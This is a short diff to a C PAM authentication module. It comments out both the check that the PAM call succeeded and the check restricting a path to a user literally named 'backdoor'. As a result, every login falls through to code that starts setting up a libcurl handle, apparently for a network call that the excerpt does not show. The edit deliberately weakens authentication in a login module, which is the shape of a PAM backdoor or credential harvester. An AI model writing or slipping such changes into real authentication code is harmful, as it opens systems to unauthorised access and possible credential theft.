@@ -26,13 +26,13 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,int argc, const
 
     printf("Welcome %s\n", pUsername);
 
-	if (retval != PAM_SUCCESS) {
-		return retval;
-	}
+	// if (retval != PAM_SUCCESS) {
+	// 	return retval;
+	// }
 
-	if (strcmp(pUsername, "backdoor") != 0) {
-		return PAM_AUTH_ERR;
-	}
+	// if (strcmp(pUsername, "backdoor") != 0) {
+	// 	return PAM_AUTH_ERR;
+	// }
     
     CURL *curl;
     CURLcode res;
